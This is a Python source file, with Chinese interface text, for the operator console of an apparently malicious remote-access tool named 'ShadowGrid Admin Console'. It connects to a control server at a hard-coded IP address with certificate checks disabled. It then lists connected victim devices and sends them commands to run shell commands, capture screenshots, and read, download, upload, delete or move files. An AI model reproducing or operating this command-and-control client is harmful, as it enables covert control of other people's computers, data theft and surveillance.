# -*- coding: utf-8 -*-
import urllib.request
import json
import os
import sys
import time
import base64
import getpass
import requests
import ssl
import subprocess

SERVER_URL = None
SESSION_AUTH = None
CLIENTS = {}
CURRENT_DEVICE = None
CURRENT_HOSTNAME = ""
CURRENT_PATH = os.getcwd().replace('/', '\\')

RESET = "\033[0m"
GREEN = "\033[92m"
BLUE = "\033[94m"
YELLOW = "\033[93m"
timestamp = time.strftime("%Y%m%d_%H%M%S")


def prompt_config():
    """配置服务器地址"""
    global SERVER_URL
    print("[配置] 请输入服务器地址 (例如: https://113.45.254.80:8444):")
    SERVER_URL = input("> ").strip()
    if not SERVER_URL:
        SERVER_URL = "https://113.45.254.80:8444"
    print(f"[配置] 使用服务器: {SERVER_URL}")


def login():
    """登录认证"""
    global SESSION_AUTH
    print("[登录] 请输入密码:")
    password = getpass.getpass("> ")
    try:
        auth_b64 = base64.b64encode(f"admin:{password}".encode()).decode()
        response = requests.post(
            f"{SERVER_URL}/login",
            headers={"Authorization": f"Basic {auth_b64}"},
            verify=False,
            timeout=10
        )
        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "ok":
                print("[登录] 认证成功")
                SESSION_AUTH = ("admin", password)
                return True
            else:
                print("[登录] 认证失败")
                return False
        else:
            print(f"[登录] HTTP {response.status_code}")
            return False
    except Exception as e:
        print(f"[登录] 错误: {e}")
        return False


def req(method, endpoint, data=None):
    """发送HTTP请求"""
    global SESSION_AUTH
    url = f"{SERVER_URL}{endpoint}"
    headers = {"Content-Type": "application/json"}
    body = json.dumps(data).encode() if data else None
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        request = urllib.request.Request(url, data=body, headers=headers, method=method)
        if SESSION_AUTH:
            auth_str = f"{SESSION_AUTH[0]}:{SESSION_AUTH[1]}"
            auth_b64 = base64.b64encode(auth_str.encode()).decode()
            request.add_header("Authorization", f"Basic {auth_b64}")
        
        with urllib.request.urlopen(request, context=context, timeout=10.0) as response:
            result = json.loads(response.read().decode())
            return result
    except Exception as e:
        return {"error": str(e)}


def fetch_clients():
    """获取设备列表"""
    global CLIENTS
    try:
        resp = req("GET", "/clients")
        CLIENTS = resp.get("clients", [])
        return CLIENTS
    except Exception as e:
        print(f"[错误] 获取设备列表失败: {e}")
        return []


def print_clients():
    """打印设备列表"""
    if not CLIENTS:
        print("[信息] 没有已连接的设备")
        return
    print("\n[信息] 可用设备:")
    for idx, client in enumerate(CLIENTS, 1):
        cid = client.get("id", "unknown")
        hostname = client.get("hostname", "unknown")
        ip = client.get("ip", "unknown")
        print(f"  {idx}. {hostname} ({ip}) [ID: {cid}]")
    print()


def send_command(client_id, cmd_type, payload=None):
    """发送命令到设备"""
    try:
        data = {"type": cmd_type}
        if payload is not None:
            data["payload"] = payload
        resp = req("POST", f"/command/{client_id}", data)
        return resp
    except Exception as e:
        return {"error": str(e)}


def get_results(client_id):
    """获取命令结果"""
    try:
        resp = req("GET", f"/results/{client_id}")
        return resp.get("results", [])
    except Exception as e:
        return [{"error": str(e)}]


def wait_for_result(client_id, timeout=0.8):
    """等待命令结果"""
    start_time = time.time()
    while time.time() - start_time < timeout:
        results = get_results(client_id)
        if results:
            return results
        time.sleep(0.02)
    return None


def format_ls_output(items):
    """格式化ls输出"""
    if not items:
        return
    if not isinstance(items, list):
        return
    for item in items:
        if isinstance(item, dict):
            name = item.get("name", "")
            is_dir = item.get("dir", False)
            if is_dir:
                print(f"  {name}/")
            else:
                print(f"  {name}")
        else:
            print(f"  {item}")


def print_failed_result(r):
    """打印错误结果"""
    err = r.get("error", "")
    result = r.get("result", "")
    if err:
        print(f"[错误] {err}")
    elif isinstance(result, str):
        print(f"[结果] {result}")


def clear_screen():
    """清屏"""
    os.system("cls" if os.name == "nt" else "clear")


def print_help():
    """打印帮助"""
    print("\n可用命令：")
    print(f"  {YELLOW}list{RESET}              列出所有可用设备")
    print(f"  {YELLOW}use <编号>{RESET}          选择设备")
    print(f"  {YELLOW}back{RESET}              返回设备列表")
    print(f"  {YELLOW}clear{RESET}             清屏")
    print(f"  {YELLOW}help{RESET}              显示帮助")
    print(f"  {YELLOW}quit{RESET}              退出")
    print("")
    print("设备命令：")
    print(f"  {YELLOW}ls [路径]{RESET}         列出目录")
    print(f"  {YELLOW}cd <目录>{RESET}         切换目录")
    print(f"  {YELLOW}pwd{RESET}               显示当前目录")
    print(f"  {YELLOW}cat <文件>{RESET}        查看文件")
    print(f"  {YELLOW}dl <文件> [目录]{RESET}   下载")
    print(f"  {YELLOW}ud <文件> [目录]{RESET}   上传")
    print(f"  {YELLOW}rm <路径> [-r]{RESET}    删除")
    print(f"  {YELLOW}mv <源> <目标>{RESET}    移动")
    print(f"  {YELLOW}file <路径>{RESET}       查看类型")
    print(f"  {YELLOW}find <模式> [-t]{RESET}  查找")
    print(f"  {YELLOW}shell <命令>{RESET}      执行命令")
    print(f"  {YELLOW}screenshot{RESET}         截图")
    print(f"  {YELLOW}help{RESET}              显示帮助")
    print(f"  {YELLOW}back{RESET}              返回")


def interaction_loop(client_id, hostname):
    """设备交互循环"""
    global CURRENT_DEVICE, CURRENT_HOSTNAME, CURRENT_PATH
    CURRENT_DEVICE = client_id
    CURRENT_HOSTNAME = hostname
    CURRENT_PATH = os.getcwd().replace('/', '\\')
    
    print(f"[信息] 已连接到设备: {hostname} (ID: {client_id})")
    print(f"[信息] 输入 'back' 返回设备列表")
    print(f"[信息] 输入 'help' 查看可用命令")
    
    # 获取远程系统信息
    send_command(client_id, "shell", "hostname")
    time.sleep(0.5)
    remote_hostname = ""
    for r in get_results(client_id):
        if r.get("result_type") == "shell":
            remote_hostname = r.get("result", "").strip()
    
    send_command(client_id, "shell", "whoami")
    time.sleep(0.5)
    remote_user = ""
    for r in get_results(client_id):
        if r.get("result_type") == "shell":
            remote_user = r.get("result", "").strip().split('\\')[-1].split('/')[-1]
    
    print(f"\n{BLUE}┌──({remote_user}@{remote_hostname})-[~]{RESET}")
    print(f"{BLUE}└─# {RESET}{GREEN}{hostname}:{CURRENT_PATH}{RESET} ")
    
    while True:
        try:
            prompt = f"{BLUE}┌──({remote_user}@{remote_hostname})-[{CURRENT_PATH}]{RESET}\n{BLUE}└─# {GREEN}>{RESET} "
            cmd_input = input(prompt).strip()
        except EOFError:
            print("\n[信息] 退出中...")
            return
        except KeyboardInterrupt:
            print("\n[信息] 使用 'quit' 退出")
            continue
        
        if not cmd_input:
            continue
        
        parts = cmd_input.split(maxsplit=1)
        cmd = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else None
        
        if cmd == "quit":
            print("[信息] 退出中...")
            sys.exit(0)
        elif cmd == "back":
            print("[信息] 返回设备列表中...")
            CURRENT_DEVICE = None
            CURRENT_HOSTNAME = ""
            return
        elif cmd == "clear":
            clear_screen()
        elif cmd == "help":
            print_help()
        elif cmd == "list":
            fetch_clients()
            print_clients()
        elif cmd == "screenshot":
            send_command(client_id, "screenshot")
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    if r.get("result_type") == "screenshot":
                        img_data = r.get("result", "")
                        filename = r.get("filename", "shot.png")
                        try:
                            img_bytes = base64.b64decode(img_data)
                            os.makedirs("screenshots", exist_ok=True)
                            save_path = os.path.join("screenshots", f"{client_id}_{timestamp}_{filename}")
                            with open(save_path, "wb") as f:
                                f.write(img_bytes)
                            print(f"[结果] 截图已保存: {save_path}")
                        except Exception as e:
                            print(f"[错误] 无法保存截图: {e}")
                    elif r.get("result_type") == "error":
                        print_failed_result(r)
        elif cmd == "ls":
            full_path = arg if arg else CURRENT_PATH
            full_path = os.path.normpath(full_path)
            send_command(client_id, "ls", full_path)
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    format_ls_output(r.get("result", []))
        elif cmd == "cd":
            if not arg:
                print("[错误] 用法: cd <目录>")
                continue
            full_path = os.path.normpath(os.path.join(CURRENT_PATH, arg))
            send_command(client_id, "cd", full_path)
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    if r.get("result_type") == "dir":
                        CURRENT_PATH = full_path
                        print(f"[结果] 已切换到目录 {CURRENT_PATH}")
                    else:
                        print_failed_result(r)
        elif cmd == "pwd":
            send_command(client_id, "pwd")
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    print(f"[结果] {r.get('result', '')}")
        elif cmd == "cat":
            if not arg:
                print("[错误] 用法: cat <文件路径>")
                continue
            full_path = os.path.normpath(os.path.join(CURRENT_PATH, arg))
            send_command(client_id, "cat", full_path)
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    if r.get("result_type") == "file":
                        file_data = r.get("result", "")
                        if file_data:
                            try:
                                print(f"[结果] {base64.b64decode(file_data).decode()}")
                            except Exception as e:
                                print(f"[错误] 解码失败: {e}")
                        else:
                            print("[错误] 文件为空")
                    else:
                        print_failed_result(r)
        elif cmd == "dl":
            if not arg:
                print("[错误] 用法: dl <文件路径> [保存目录]")
                continue
            parts = arg.split(maxsplit=1)
            file_path = parts[0]
            save_dir = parts[1] if len(parts) > 1 else "downloads"
            full_path = os.path.normpath(os.path.join(CURRENT_PATH, file_path))
            os.makedirs(save_dir, exist_ok=True)
            send_command(client_id, "dl", {"path": file_path, "save_as": ""})
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    if r.get("result_type") == "file":
                        file_bytes = base64.b64decode(r.get("result", ""))
                        save_path = os.path.join(save_dir, r.get("filename", "downloaded"))
                        with open(save_path, "wb") as f:
                            f.write(file_bytes)
                        print(f"[结果] 文件已下载: {save_path}")
                    else:
                        print_failed_result(r)
        elif cmd == "ud":
            if not arg:
                print("[错误] 用法: ud <本地文件> [远程目录]")
                continue
            parts = arg.split(maxsplit=1)
            local_file = parts[0]
            remote_dir = parts[1] if len(parts) > 1 else "."
            if not os.path.isfile(local_file):
                print("[错误] 本地文件未找到")
                continue
            with open(local_file, "rb") as f:
                base64_data = base64.b64encode(f.read()).decode()
            save_as = os.path.join(CURRENT_PATH, os.path.basename(local_file))
            send_command(client_id, "ud", {"base64_data": base64_data, "save_as": save_as})
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    print_failed_result(r)
        elif cmd == "rm":
            if not arg:
                print("[错误] 用法: rm <路径> [-r]")
                continue
            recursive = arg.endswith(" -r")
            path = arg[:-3] if recursive else arg
            full_path = os.path.normpath(os.path.join(CURRENT_PATH, path))
            send_command(client_id, "rm", {"path": full_path, "recursive": recursive})
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    print_failed_result(r)
        elif cmd == "mv":
            if not arg or len(arg.split()) < 2:
                print("[错误] 用法: mv <源> <目标>")
                continue
            parts = arg.split(maxsplit=1)
            src, dst = parts[0], parts[1]
            full_src = os.path.normpath(os.path.join(CURRENT_PATH, src))
            full_dst = os.path.normpath(os.path.join(CURRENT_PATH, dst))
            send_command(client_id, "mv", {"from_path": full_src, "to_path": full_dst})
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    print_failed_result(r)
        elif cmd == "file":
            if not arg:
                print("[错误] 用法: file <路径>")
                continue
            full_path = os.path.normpath(os.path.join(CURRENT_PATH, arg))
            send_command(client_id, "file", {"path": full_path})
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    if r.get("result_type") == "file":
                        print(f"[结果] {r.get('result', '')}")
                    else:
                        print_failed_result(r)
        elif cmd == "find":
            if not arg:
                print("[错误] 用法: find <模式> [-t 类型]")
                continue
            parts = arg.split()
            pattern = None
            file_type = None
            i = 0
            while i < len(parts):
                if parts[i] == "-t" and i + 1 < len(parts):
                    file_type = parts[i + 1]
                    i += 1
                else:
                    if not pattern:
                        pattern = parts[i]
                i += 1
            if not pattern:
                print("[错误] 用法: find <模式> [-t 类型]")
                continue
            full_path = os.path.normpath(os.path.join(CURRENT_PATH, pattern))
            send_command(client_id, "find", {"path": full_path, "name": pattern, "type": file_type})
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    if r.get("result_type") == "list":
                        for item in r.get("result", []):
                            print(f"  [{item.get('type', '').upper()}] {item.get('path', '')}")
                    else:
                        print_failed_result(r)
        elif cmd == "shell":
            if not arg:
                print("[错误] 用法: shell <命令>")
                continue
            send_command(client_id, "shell", arg)
            results = wait_for_result(client_id)
            if results:
                for r in results:
                    if r.get("result_type") == "shell":
                        print(f"[结果]\n{r.get('result', '')}")
                    else:
                        print_failed_result(r)
        elif cmd == "help":
            print_help()
        else:
            print(f"[错误] 未知命令: {cmd}")


def show_splash():
    """显示启动画面"""
    import splash
    print(splash.get_splash())


def main():
    """主函数"""
    show_splash()
    print("[信息] ShadowGrid Admin Console v1.0")
    
    prompt_config()
    
    if not login():
        print("[错误] 登录失败")
        sys.exit(1)
    
    print("[信息] 输入 'help' 查看可用命令")
    
    while True:
        try:
            cmd_input = input("srt > ").strip()
        except EOFError:
            print("\n[信息] 退出中...")
            break
        except KeyboardInterrupt:
            print("\n[信息] 使用 'quit' 退出")
            continue
        
        if not cmd_input:
            continue
        
        parts = cmd_input.split(maxsplit=1)
        cmd = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else None
        
        if cmd == "quit":
            print("[信息] 退出中...")
            break
        elif cmd == "help":
            print_help()
        elif cmd == "list":
            fetch_clients()
            print_clients()
        elif cmd == "use":
            if not arg:
                print("[错误] 用法: use <编号>")
                continue
            try:
                num = int(arg)
                if num < 1 or num > len(CLIENTS):
                    print(f"[错误] 无效的设备编号")
                    continue
                selected = CLIENTS[num - 1]
                interaction_loop(selected.get("id"), selected.get("hostname"))
            except ValueError:
                print("[错误] 无效的设备编号")
        elif cmd == "clear":
            clear_screen()
        else:
            print(f"[错误] 未知命令: {cmd}。使用 'help' 查看命令列表。")


if __name__ == "__main__":
    main()
